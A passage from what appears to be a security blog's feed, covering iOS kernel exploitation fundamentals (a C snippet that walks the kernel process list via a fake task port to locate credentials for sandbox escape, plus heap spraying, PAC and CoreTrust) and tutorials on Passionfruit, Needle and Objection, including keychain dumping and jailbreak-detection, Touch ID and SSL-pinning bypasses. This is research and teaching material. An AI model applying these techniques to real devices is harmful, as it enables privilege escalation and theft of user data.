    <span class="mi">682</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_unlock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">683</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_spinlock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">684</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_spinunlock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">685</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_list_lock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">686</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_list_unlock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">687</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_klist_lock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">688</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_klist_unlock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span></code></pre></figure>

<p>One can then scour these structs using again the same function <strong>pid_for_task()</strong> to find the current proc struct by checking for <strong>pid = getpid()</strong> (so we can change the creds in the proc struct later to escape the sandbox), and kernproc by checking for pid = 0 (so we can get kern proc creds, find kernel task, ipc_space_kernel etc).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// extern struct proclist allproc;</span>
    <span class="c1">// This global variable stores the start of the linked_list of all proc objects</span>
    <span class="kt">uint64_t</span> <span class="n">allproc</span> <span class="o">=</span> <span class="n">allproc_offset</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">proc_</span> <span class="o">=</span> <span class="n">allproc</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">myproc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">kernproc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc_</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">uint64_t</span> <span class="n">proc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="c1">// Getting the address of the next proc object in the linked list</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc_</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
        <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="p">(</span><span class="kt">int32_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">proc</span><span class="p">);</span>
        <span class="c1">// Need to read 2 times cause "pid_for_task" can only read 4 bytes at a time</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">proc_</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
        <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="p">(</span><span class="kt">int32_t</span><span class="o">*</span><span class="p">)(((</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">proc</span><span class="p">))</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>

        <span class="c1">// Getting the PID of from proc-&gt;p_pid</span>
        <span class="kt">int</span> <span class="n">pd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
        <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pd</span><span class="p">);</span>

        <span class="c1">// Checking if it equals my PID</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">pd</span> <span class="o">==</span> <span class="n">getpid</span><span class="p">())</span> <span class="p">{</span>
            <span class="c1">// Address of my proc struct</span>
            <span class="n">myproc</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">pd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
            <span class="c1">// Address of the kernel proc struct</span>
            <span class="n">kernproc</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc_</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h2 id="heap-allocation-basics">Heap Allocation Basics</h2>

<p>This is a very brief discussion about Heap Allocation in iOS. In iOS, the heap memory is divided into various zones. Allocations of same size will go into same zones, unless for certain objects which have their own special zones (ports, vouchers etc). These zones grow as more objects are allocated, with the new pages being fetched from the zone map. One can see the zones allocated with the <strong>zprint</strong> command on Mac OS. It is assumed that a lot of heap allocation techniques will still be the same in iOS. Another thing is to note that iOS has zone garbage collection as well.</p>

<p><img src="/images/30.png" alt="30" /></p>

<p>As discussed, certain objects have their own special zones. A zone is a collection of fixed size data blocks for which quick allocation and deallocation is possible. For e.g, in the image below, we can see that the a lot of the IPC objects, which includes ports, vouchers etc have their own zones. Hence if you are able to free a voucher let’s say, you won’t be able to overlap it with another object, unless you trigger zone garbage collection and move the page containing that address somewhere else to be reallocated again with a different kind of object.</p>

<p><img src="/images/31.png" alt="31" /></p>

<p>The heap has been hardened significantly in the last few iOS versions. I highly recommend checking out <a href="https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf">this</a> talk on iOS Kernel Heap by Stefan Esser. Additionally, you can also check out the kernel source code. Start by looking <strong>osfmk/kern/zalloc.c</strong> which has some comments on heap allocation and just follow along from there.</p>

<p><img src="/images/38.png" alt="38" /></p>

<p>One of the common techniques used in recent exploits for heap spraying is to fill the memory with an array of Port pointers by sending a Mach message with the option <strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>. This calls the method <strong>ipc_kmsg_copyin_ool_ports_descriptor</strong> in <strong>ipc/ipc_kmsg.c</strong> which has a kalloc call (<strong>kalloc(ports_length)</strong>) that fills the heap with port pointers. The advantage of this is in the voucher_swap exploit was that while the allocation of Ports would have put them into their own <strong>ipc.port</strong> zones, in the case of port pointers this is not the case and hence reallocation on top of freed objects with port pointers is possible. Well, again this is not entirely true and reallocation with ports is possible as you can do enough spraying with Ports such that the kernel is force to do garbage collection and allocate fresh pages from the zone map which might include the freed objects. This is discussed in Part 2 of this series.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">mach_msg_descriptor_t</span> <span class="o">*</span>
    <span class="n">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="p">(</span>
    	<span class="n">mach_msg_ool_ports_descriptor_t</span> <span class="o">*</span><span class="n">dsc</span><span class="p">,</span>
    	<span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="n">user_dsc</span><span class="p">,</span>
    	<span class="kt">int</span> <span class="n">is_64bit</span><span class="p">,</span>
    	<span class="n">vm_map_t</span> <span class="n">map</span><span class="p">,</span>
    <span class="p">.....................</span>
        <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>  <span class="cm">/* for now */</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">(</span><span class="n">ports_length</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_NO_BUFFER</span><span class="p">;</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span></code></pre></figure>

<h2 id="pointer-authentication-check-and-coretrust">Pointer Authentication Check and CoreTrust</h2>

<p>The ARM 8.3 instruction set added a new feature called Pointer Authentication Check (PAC). It’s purpose is to check the integrity of the pointers. It works by attaching a cryptographic signature to pointer values in its unused bits, and then those signatures are verified before a pointer is used. Since the attacker doesn’t have the keys to create the signatures for these pointers, he is not able to create valid pointers.</p>

<p>CoreTrust on the other hand is a separate kernel extension (<strong>com.apple.kext.CoreTrust</strong>) that doesn’t allow self-signed binaries (<strong>jtool2</strong> –sign) to run on the device. Previously, Apple Mobile File Integrity Kext (AMFI.kext) would work in conjunction with the <strong>amfid</strong> daemon which is in userland to check for code signatures. This was bypassed in many ways by injecting the code signature hash into the AMFI trust cache, hooking onto amfid exception ports and allowing code execution to continue etc. CoreTrust imposes some additional checks that only allow Apple signed binaries to run on the device. It is still possible ro run binaries signed with Apple certificates, which anyone can get for free and run the binary once signed with it.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this article, we looked at some of the basic fundamentals of iOS security which will serve as building blocks for the next two articles. The next article will discuss the <strong>voucher_swap</strong> exploit in detail whereas the third part would discuss Jailbreaking.</p>

<h2 id="references">References</h2>

<ol>
  <li>Project Zero Issue tracker - https://bugs.chromium.org/p/project-zero/issues/detail?id=1731</li>
  <li>iOS 10 - Kernel Heap Revisited - https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf</li>
  <li>Mac OS X Internals: A Systems Approach - https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>CanSecWest 2017 - Port(al) to the iOS Core - https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><category term="ios" /><summary type="html"><![CDATA[On Jan 22, 2019, Google Project Zero researcher @_bazad tweeted the following.]]></summary></entry><entry><title type="html">iOS Application Security Part 55 - Inspecting iOS apps with Passionfruit</title><link href="/2018/07/31/ios-application-security-part-55-inspecting-ios-apps-with-passionfruit.html" rel="alternate" type="text/html" title="iOS Application Security Part 55 - Inspecting iOS apps with Passionfruit" /><published>2018-07-31T10:11:00+00:00</published><updated>2018-07-31T10:11:00+00:00</updated><id>/2018/07/31/ios-application-security-part-55-inspecting-ios-apps-with-passionfruit</id><content type="html" xml:base="/2018/07/31/ios-application-security-part-55-inspecting-ios-apps-with-passionfruit.html"><![CDATA[<p>In this article, we will have a look at passionfruit which is an iOS blackbox app analysis tool based on Frida . It also provides a really nice web GUI which makes analysis relatively easy. Here is the list of features as per their <a href="https://github.com/chaitin/passionfruit">Github</a> page.</p>

<ul>
  <li>Cross plarform web GUI!</li>
  <li>Also supports non-jailbroken device (see Non-jailbroken device).</li>
  <li>List all url schemes.</li>
  <li>Check signature entitlements.</li>
  <li>List human readable app meta info (Info.plist).</li>
  <li>Capture screenshot.</li>
  <li>Checksec: see if target app is encrypted, and has enabled PIE, ARC and stack canary.</li>
  <li>App sandbox file browser. Directly preview images, SQLite databases and plist files on device. You can always download the file for further investigation.</li>
  <li>Check the loaded frameworks. Hook exported native functions from these dylib to print the arguments and stack trace.</li>
  <li>Log SQLite operations.</li>
  <li>Log and try to bypass jailbreak detection.</li>
  <li>List Objective-C classes from app, hook the methods and inspect the arguments and stack trace.</li>
  <li>Dump KeyChain, BinaryCookies and UserDefaults.</li>
</ul>

<!--more-->

<p>To install Passionfruit, simple run the command <em>npm install -g passionfruit</em></p>

<p><img src="/images/posts/ios55/1.png" alt="1" /></p>

<p>Once installed, just run the command <em>passionfruit</em> to run it. It will start a server on localhost. <img src="/images/posts/ios55/2.png" alt="2" /></p>

<p>Head over to the address mentioned. Please note that you need to have a jailbroken device connected over USB which has Frida installed on it. However, if there is no jailbroken device connected, then the app to be inspected needs to have the FridaGadget.dylib file injected into it. This has been explained in a lot of detail in the previous articles in the same series. You will be greeted with a UI like this.</p>

<p><img src="/images/posts/ios55/3.png" alt="3" /></p>

<p>Clicking on any app will just spawn the app on the device. And you will see a lot of useful information about the app, which includes the Bundle and the Data Directory, the entitlements used by the app, the URL schemes and the contents of the Info.plist file.</p>

<p><img src="/images/posts/ios55/4.png" alt="4" /></p>

<p>This is extremely useful information. On the top you can also see some options about the binary (PIE, ENC, ARC, Stack Canary etc). Ideally you will be scrambling for this infomration from the command line. You can also just browse the contents of the device filesystem using this web GUI. For e.g, let’s click on the Data directory.</p>

<p><img src="/images/posts/ios55/5.png" alt="5" /></p>

<p>Now let’s head onto the Documents directory.</p>

<p><img src="/images/posts/ios55/6.png" alt="6" /></p>

<p>We can view plist or sqlite files using the inbuilt viewers that come with passionfruit.</p>

<p><img src="/images/posts/ios55/7.png" alt="7" /></p>

<p>The Modules tab will show you all the loaded modules with this application.</p>

<p><img src="/images/posts/ios55/9.png" alt="9" /></p>

<p>And the Classes tab will show you all the loaded classes into this application.</p>

<p><img src="/images/posts/ios55/10.png" alt="10" /></p>

<p>Clicking on any class will show you the corresponding methods for that class. If you click on any of these methods, it will create a hook for it. If this method gets called, you will see it in the Console Tab. You can manage these hooks using the <em>Manage Hooks</em> tab on the top right.</p>

<p><img src="/images/posts/ios55/11.png" alt="11" /> <img src="/images/posts/ios55/14.png" alt="14" /></p>

<p>The code runner tab will allow you to run Frida scripts in javascript.</p>

<p><img src="/images/posts/ios55/15.png" alt="15" /></p>

<p>The Storage section will show you all the data stored via Keychain, UserDefaults or Cookies APIs.</p>

<p><img src="/images/posts/ios55/12.png" alt="12" /> <img src="/images/posts/ios55/13.png" alt="13" /></p>

<p>This was an intro to using Passionfruit. As it can be seen, this tool can be extremely useful in assessing the security of iOS apps because of its nice UI that gives a plethora of info about the application which would normally require some decent effort to gather.</p>

<p>The following tests were performed on a jailbroken iPhone6 device running iOS 10.0.1.</p>

<p><strong>References</strong></p>

<ol>
  <li>https://github.com/chaitin/passionfruit</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><summary type="html"><![CDATA[In this article, we will have a look at passionfruit which is an iOS blackbox app analysis tool based on Frida . It also provides a really nice web GUI which makes analysis relatively easy. Here is the list of features as per their Github page.]]></summary></entry><entry><title type="html">iOS Application Security Part 54 - The Needle Framework</title><link href="/2018/07/30/ios-application-security-part-54-the-needle-framework.html" rel="alternate" type="text/html" title="iOS Application Security Part 54 - The Needle Framework" /><published>2018-07-30T11:47:00+00:00</published><updated>2018-07-30T11:47:00+00:00</updated><id>/2018/07/30/ios-application-security-part-54-the-needle-framework</id><content type="html" xml:base="/2018/07/30/ios-application-security-part-54-the-needle-framework.html"><![CDATA[<p>In this article, we will talk about another framework for assessing iOS apps named <a href="https://github.com/mwrlabs/needle/">Needle.</a> Released by MWR labs and written by Marco Lancini, it provides a lot of modules that with help automate a lot of the tasks while doing iOS security assessments. Needle requires a jailbroken device and uses an agent installed on the jailbroken device that communicates with the host installed on the computer. At the time of writing of this article, Needle supports devices until iOS 10 only.
<!--more--></p>

<p>To install Needle, add the source http://mobiletools.mwrinfosecurity.com/cydia/ in Cydia and then search for NeedleAgent and install it.</p>

<p><img src="/images/posts/ios54/1.PNG" alt="1" /></p>

<p>Open the NeedleAgent app and make sure it is listening.</p>

<p><img src="/images/posts/ios54/2.PNG" alt="2" /></p>

<p>On your computer, clone the latest version of Needle and install all the dependencies . A detailed installation guide can be found <a href="https://github.com/mwrlabs/needle/wiki/Installation-Guide">here</a>.</p>

<p><img src="/images/posts/ios54/3c.png" alt="3c" /></p>

<p>Make sure the needle agent is running in foreground on the device. Run the <em>show options</em> command to see all the list of global options.</p>

<p><img src="/images/posts/ios54/4c.png" alt="4c" /></p>

<p>Make sure to set the correct PASSWORD option to let Needle connect to the device. Once you have configured these settings, run the <em>shell</em> command to get a shell on your device. Another important global option that you can set is the OUTPUT_FOLDER option. You can then use the <em>exit</em> command to exit out of the shell and back into the needle interpreter.</p>

<p><img src="/images/posts/ios54/5c.png" alt="5c" /></p>

<p>Running the command <em>show modules</em> will list all the modules that Needle supports.</p>

<p><img src="/images/posts/ios54/6c.png" alt="6c" /></p>

<p>You can use any module with the <em>use modulename</em> command, and the <em>run</em> command will execute the module for you. If you want to analyze any specific app, you can see the app bundle id as a global parameter. If this is not set, needle will display a prompt to let you choose whichever app id you want.</p>

<p><img src="/images/posts/ios54/7c.png" alt="7c" /> <img src="/images/posts/ios54/8c.png" alt="8c" /></p>

<p>The following module will tell you the URL schemes the app registers to by copying the info.plist file.</p>

<p><img src="/images/posts/ios54/9c.png" alt="9c" /></p>

<p>And this one will give the MDM user settings for the device.</p>

<p><img src="/images/posts/ios54/10c.png" alt="10c" /></p>

<p>Running the <em>info</em> command after selecting a module will give you the details about that particular module.</p>

<p><img src="/images/posts/ios54/11c.png" alt="11c" /></p>

<p>Needle also has many different modules for working with Frida.</p>

<p><img src="/images/posts/ios54/12c.png" alt="12c" /></p>

<p>And in some cases the modules might also have certain options that need to be configured.</p>

<p><img src="/images/posts/ios54/13c.png" alt="13c" /></p>

<p>Here is the full list of modules. It is important to note that not all of these features work for iOS 10, and thus at the time of writing this article, needle doesn’t support iOS 10 completely.</p>

<pre>	[needle] &gt; show modules

	  _Templates
	  ----------
	    _templates/template_background
	    _templates/template_base
	    _templates/template_frida
	    _templates/template_frida_script
	    _templates/template_static

	  Binary
	  ------
	    binary/info/checksums
	    binary/info/compilation_checks
	    binary/info/metadata
	    binary/info/provisioning_profile
	    binary/info/universal_links
	    binary/installation/install
	    binary/installation/pull_ipa
	    binary/reversing/class_dump
	    binary/reversing/class_dump_frida_enum-all-methods
	    binary/reversing/class_dump_frida_enum-classes
	    binary/reversing/class_dump_frida_find-class-enum-methods
	    binary/reversing/shared_libraries
	    binary/reversing/strings

	  Comms
	  -----
	    comms/certs/delete_ca
	    comms/certs/export_ca
	    comms/certs/import_ca
	    comms/certs/install_ca_burp
	    comms/certs/install_ca_mitm
	    comms/certs/list_ca
	    comms/certs/view_cert
	    comms/proxy/pinning_bypass_frida
	    comms/proxy/proxy_regular

	  Device
	  ------
	    device/agent_client
	    device/clean_storage
	    device/dependency_installer
	    device/hosts
	    device/list_apps

	  Dynamic
	  -------
	    dynamic/detection/jailbreak_detection
	    dynamic/detection/script_jailbreak-detection-bypass
	    dynamic/ipc/open_uri
	    dynamic/memory/heap_dump
	    dynamic/monitor/files
	    dynamic/monitor/pasteboard
	    dynamic/monitor/syslog
	    dynamic/watch/syslog

	  Hooking
	  -------
	    hooking/cycript/cycript_shell
	    hooking/cycript/cycript_touchid
	    hooking/frida/frida_launcher
	    hooking/frida/frida_shell
	    hooking/frida/frida_trace
	    hooking/frida/script_anti-hooking-check
	    hooking/frida/script_dump-ui
	    hooking/frida/script_hook-all-methods-of-class
	    hooking/frida/script_hook-method-of-class
	    hooking/frida/script_touch-id-bypass
	    hooking/theos/list_tweaks
	    hooking/theos/theos_tweak

	  Mdm
	  ---
	    mdm/effective_user_settings

	  Static
	  ------
	    static/code_checks

	  Storage
	  -------
	    storage/backup/icloud_content_frida
	    storage/caching/keyboard_autocomplete
	    storage/caching/screenshot
	    storage/data/container
	    storage/data/files_binarycookies
	    storage/data/files_cachedb
	    storage/data/files_plist
	    storage/data/files_sql
	    storage/data/keychain_dump
	    storage/data/keychain_dump_frida

	[needle] &gt;
</pre>

<p><strong>References</strong></p>

<ol>
  <li>https://github.com/mwrlabs/needle/</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><summary type="html"><![CDATA[In this article, we will talk about another framework for assessing iOS apps named Needle. Released by MWR labs and written by Marco Lancini, it provides a lot of modules that with help automate a lot of the tasks while doing iOS security assessments. Needle requires a jailbroken device and uses an agent installed on the jailbroken device that communicates with the host installed on the computer. At the time of writing of this article, Needle supports devices until iOS 10 only.]]></summary></entry><entry><title type="html">iOS Application Security Part 53 - Objection continued</title><link href="/2018/07/29/ios-application-security-part-53-objection-continued.html" rel="alternate" type="text/html" title="iOS Application Security Part 53 - Objection continued" /><published>2018-07-29T17:48:00+00:00</published><updated>2018-07-29T17:48:00+00:00</updated><id>/2018/07/29/ios-application-security-part-53-objection-continued</id><content type="html" xml:base="/2018/07/29/ios-application-security-part-53-objection-continued.html"><![CDATA[<p>In this article, we will continue looking into Objection and some of the use cases it provides.</p>

<p>One of the most useful features objection provides is the ability to bypass jailbreak detection. This might not be always effective since it’s only looking for certain checks that an application will do to detect a jailbroken device and hooks them to return a false value. But any application can deploy a check not looked into by objection and the jailbreak detection bypass will fail. Neverthless, this feature might be useful in many cases where the apps are doing basic checks only.</p>

<!--more-->
<p><img src="/images/posts/ios53/1a.png" alt="1a" /></p>

<p>It is also important to note that an application can just use some native C code to detect all the injected dylibs into the application and simply exit the app without any warning if it finds a dylib with the name FridaGadget. This has been observed in some apps that i have tested. A simple bypass would be to just change the name of the Frida dylib file to something else.</p>

<p>You can also simulate a jailbroken environment to understand how an application behaves in a jailbroken environment.</p>

<p><img src="/images/posts/ios53/2a.png" alt="2a" /></p>

<p>Objection uses jobs to list all the tasks that it is performing in the background. You can use the command <em>jobs list</em> to list the tasks and <em>jobs kill UDID</em> to kill them.</p>

<p><img src="/images/posts/ios53/ 3a.png" alt="3a" /></p>

<p>The hooking module is one of the most useful modules as it allows you to list the classes, methods, trace all the function calls and even dump the args or modify the return value.</p>

<p>Use the command <em>ios hooking list classes</em> to list all the classes.</p>

<p><img src="/images/posts/ios53/4a.png" alt="4a" /></p>

<p>Use the command <em>ios hooking list class_methods classname</em> to list all the methods for a particular class.</p>

<p><img src="/images/posts/ios53/5a.png" alt="5a" /></p>

<p>Use the command <em>ios hooking watch classname</em> to trace all the methods for a particular class.</p>

<p><img src="/images/posts/ios53/6a.png" alt="6a" /></p>

<p>We can now look for certain methods and dump the arguments (–dump-args) and return value (–dump-return). And the –dump-backtrace command will give you a list of the previous methods being called.</p>

<p><img src="/images/posts/ios53/12a.png" alt="12a" /></p>

<p>Let’s try and solve the Jailbreak Detection challenge in Damn Vulnerable iOS App.</p>

<p><img src="/images/posts/ios53/8a.png" alt="8a" /></p>

<p>And you can also set return values of methods. In this case, it is used to bypass Jailbreak Detection in Damn Vulnerable iOS App.</p>

<p><img src="/images/posts/ios53/7a.png" alt="7a" /></p>

<p>You can also enable Touch ID Bypass which as discussed in previous articles can be bypassed by hooking into the method -[LAContext evaluatePolicy:localizedReason:reply:]. This hooking technique will only work in some cases as discussed in a previous article on Touch ID bypass in this series. On devices with FaceID do some incorrect attmepts and then click on Enter passcode which will trigger the bypass.</p>

<p><img src="/images/posts/ios53/11a.png" alt="11a" /></p>

<p>Use the command <em>ios pasteboard monitor</em> to monitor the contents of the Pasteboard.</p>

<p><img src="/images/posts/ios53/9a.png" alt="9a" /></p>

<p>Use the command <em>ios sslpinning disable</em> to disable sslpinning. Ofcourse this method is not foolproof and tries to hook into some low level methods that are called while doing SSL pinning validation.</p>

<p><img src="/images/posts/ios53/10a.png" alt="10a" /></p>

<p>And finally, you can use the <em>ios ui</em> module to take a screenshot or just dump the view hierarchy.</p>

<p><img src="/images/posts/ios53/13a.png" alt="13a" /></p>

<p>In this article, we had a good look at some of the advanced functionalities that objection provides. In the next article, we will look at another essential framework named Needle to help with iOS security assessments.</p>

<p><strong>References</strong></p>

<ol>
  <li>https://github.com/sensepost/objection</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><summary type="html"><![CDATA[In this article, we will continue looking into Objection and some of the use cases it provides.]]></summary></entry><entry><title type="html">iOS Application Security Part 52 - Inspecting iOS apps with Objection</title><link href="/2018/07/28/ios-application-security-part-52-inspecting-ios-apps-with-objection.html" rel="alternate" type="text/html" title="iOS Application Security Part 52 - Inspecting iOS apps with Objection" /><published>2018-07-28T10:48:00+00:00</published><updated>2018-07-28T10:48:00+00:00</updated><id>/2018/07/28/ios-application-security-part-52-inspecting-ios-apps-with-objection</id><content type="html" xml:base="/2018/07/28/ios-application-security-part-52-inspecting-ios-apps-with-objection.html"><![CDATA[<p>In the previous few articles, we have looked at how we can use Frida to perform dynamic instrumentation of applications. In this article, we will look at a tool based using Frida’s capabilities, known as <a hred="https://github.com/sensepost/objection">objection</a>, which can be very useful in testing iOS applications on non-jailbroken devices. The only thing that is required is an unencrypted IPA (insert Frida Gadget using <a href="https://github.com/Tyilo/insert_dylib">insert_dylb</a>) or the source code. Since in the previous article we already looked at how we can add a Frida dylib into the source code and do instrumentation, we will carry forward from there in this article. We will be using <a href="http://damnvulnerableiosapp.com">Damn Vulnerable iOS App</a> for this article.</p>

<!--more-->

<p>Here are the various features of Objection as mentioned on their Github <a href="https://github.com/sensepost/objection">page</a>.</p>

<p><img src="/images/posts/ios52/1.png" alt="1" /></p>

<p>The first thing is to install Objection on the computer which can be installed very easily with <em>pip3 install objection</em>. In some cases, you might be better off setting up a virtual environemnt for python3. It is recommended to go through the installation instructions mentioned on their Github page.</p>

<p><img src="/images/posts/ios52/2.png" alt="2" /></p>

<p>Once done, run the command <em>objection</em> to see if it was successfully installed.</p>

<p><img src="/images/posts/ios52/3.png" alt="3" /></p>

<p>Make sure you have an application that has FridaGadget.dylib injected into it. Start the application on the device and it will pause as its waiting for a frida client to attach to it. Now from your computer, run the <em>objecion device_type</em> command to do a quick test.</p>

<p><img src="/images/posts/ios52/4.png" alt="4" /></p>

<p>Now run the command <em>objection explore -q</em> to attach to the application. Keep in mind that this is not early instrumentation since you are attaching to the application after is is being launched. For early instrumentation you can just use Frida with the spawn command.</p>

<p><img src="/images/posts/ios52/5.png" alt="5" /></p>

<p>You can just press TAB on your computer to see all the list of available commands. One of the most useful features of objection is the autocompletion feature so we don’t have to remember all these commands.</p>

<p><img src="/images/posts/ios52/14.png" alt="14" /></p>

<p>For any extra tasks not performed by objection, you can just load the corresponding fridascript with the import command.</p>

<p><img src="/images/posts/ios52/15.png" alt="15" /></p>

<p>Ok, now we can use objection to do various tasks. It is important to note that whatever is happening here is happening within the context of the application with all the sandbox restrictions still being employed in place. Also, all the ios specific commands start with <em>ios</em>. Also, any command you want to run on your computer from within the objection interpreter must have ! prepended to it.</p>

<p>Use <em>pwd print</em> to print out the current working directory.</p>

<p><img src="/images/posts/ios52/6.png" alt="6" /></p>

<p>A simple <em>ls</em> command will dump the contents from the current working directory within the application context.</p>

<p><img src="/images/posts/ios52/7.png" alt="7" /></p>

<p>Let’s run <em>env</em> and this will give us all the folders related to the application. We are mostly interested in the application data here which is mostly present in the Documents folder.</p>

<p><img src="/images/posts/ios52/8.png" alt="8" /></p>

<p>Now let’s head over to the Documents directory and run the ls command there.</p>

<p><img src="/images/posts/ios52/9.png" alt="9" /></p>

<p>The data stored in the info.plist file can be dumped with <em>ios plist cat filename</em> command.</p>

<p><img src="/images/posts/ios52/10.png" alt="10" /></p>

<p>Optionally, another way of achieving the same would be to download the file to your computer with the <em>file download filename</em> command and then use the OS command cat (prepended with an !) to list the contents of the file.</p>

<p><img src="/images/posts/ios52/11.png" alt="11" /></p>

<p>You can see all the data stored using the NSUserDefaults or UserDefaults (in new SDKs) using the <em>ios nsuserdefaults get</em> command.</p>

<p><img src="/images/posts/ios52/12.png" alt="12" /></p>

<p>And you can use the <em>ios keychain dump</em> to dump the keychain.</p>

<p><img src="/images/posts/ios52/13.png" alt="13" /></p>

<p>In the next article, we will continue looking at some of the other useful functionalities of Objection.</p>

<p><strong>References</strong></p>

<ol>
  <li>https://github.com/sensepost/objection</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><summary type="html"><![CDATA[In the previous few articles, we have looked at how we can use Frida to perform dynamic instrumentation of applications. In this article, we will look at a tool based using Frida’s capabilities, known as objection, which can be very useful in testing iOS applications on non-jailbroken devices. The only thing that is required is an unencrypted IPA (insert Frida Gadget using insert_dylb) or the source code. Since in the previous article we already looked at how we can add a Frida dylib into the source code and do instrumentation, we will carry forward from there in this article. We will be using Damn Vulnerable iOS App for this article.]]></summary></entry><entry><title type="html">iOS Application Security Part 51 - Dumping decrypted IPA and Dynamic Instrumentation on a non-jailbroken device</title><link href="/2018/07/27/ios-application-security-part-51-dumping-decrypted-ipa-and-dynamic-instrumentation-on-a-non-jailbroken-device.html" rel="alternate" type="text/html" title="iOS Application Security Part 51 - Dumping decrypted IPA and Dynamic Instrumentation on a non-jailbroken device" /><published>2018-07-27T19:48:00+00:00</published><updated>2018-07-27T19:48:00+00:00</updated><id>/2018/07/27/ios-application-security-part-51-dumping-decrypted-ipa-and-dynamic-instrumentation-on-a-non-jailbroken-device</id><content type="html" xml:base="/2018/07/27/ios-application-security-part-51-dumping-decrypted-ipa-and-dynamic-instrumentation-on-a-non-jailbroken-device.html"><![CDATA[<p>In this article, we will look at how to dump decrypted IPA file for an application using frida and then look at how to set up 